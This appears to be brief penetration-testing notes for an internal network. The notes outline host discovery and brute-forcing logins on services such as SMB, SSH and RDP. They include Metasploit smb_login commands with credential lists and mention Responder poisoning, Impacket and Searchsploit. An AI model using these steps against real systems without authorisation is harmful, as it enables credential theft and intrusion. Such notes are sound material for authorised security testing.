# Steps:-
1.	First of all we want Inventory of organization 
2.	Separate IP’S of Systems, Servers, Networking Devices   
3.	Verify these IP'S Using PingInfo / AngryIPScanner
	
#   Brute-Force As Local User On These Port's 
{ FTP(21), SSH(22), Kerberos(89), SMB(139/445), LDAP(389), MSSQL(1433/1434), MYSQL(3306), RDP(3389), VNC(5900) }

# Tool 1. TIP ( But Go For SMB First ) Only For local user account
```
msfconsole
auxiliary/scanner/smb/smb_login
set PASS_FILE /root/Desktop/pass.txt
set USER_FILE /root/Desktop/user.txt
set RHOSTS file:/root/Desktop/host.txt
```
# If AD Implemented 
```
set SMBDomain ADDomain 
```
# If LOCKOUT Policy is Set Then Use 
```
set ABORT_ON_LOCKOUT true
```

# Tool 2. IMPACKET
LLMNR/NBT-NS Poising with the help of Responder 
Tools ---->>>> IMPACKET, RPC-Client, ENUM4LINUX, SMBMAP, SMBCLIENT, KERBRUTE 

Exploit Services by Searchsploit, Exploit DB
